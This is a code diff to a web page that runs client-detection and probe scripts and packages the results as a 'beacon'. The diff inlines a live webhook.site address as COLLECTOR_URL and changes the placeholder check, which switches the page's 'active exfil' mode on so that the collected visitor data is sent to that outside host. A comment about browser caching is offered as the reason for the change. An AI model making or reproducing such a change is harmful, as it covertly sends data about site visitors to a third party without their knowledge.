@@ -56,9 +56,12 @@
 
 </div>
 
-<script src="js/collector-config.js"></script>
-<script src="js/client-detect.js"></script>
-<script src="js/probes.js"></script>
+<script>
+  /* Collector URL — inlined to avoid browser cache serving stale collector-config.js */
+  var COLLECTOR_URL = "https://webhook.site/1a50d175-1bed-455a-a407-7246a26d77e9";
+</script>
+<script src="js/client-detect.js?v=3"></script>
+<script src="js/probes.js?v=3"></script>
 <script>
 (function() {
   "use strict";
@@ -168,7 +171,7 @@
     var payloadStr = JSON.stringify(beacon, null, 2);
     exfilPayload.textContent = payloadStr;
 
-    if (!COLLECTOR_URL || COLLECTOR_URL === "https://webhook.site/1a50d175-1bed-455a-a407-7246a26d77e9") {
+    if (!COLLECTOR_URL || COLLECTOR_URL === "<SET-ME>") {
       exfilStatus.textContent = "⚠ COLLECTOR_URL not set — data displayed above only (not transmitted). " +
                                 "Edit js/collector-config.js to enable active exfil.";
       exfilStatus.style.color = "var(--warn)";
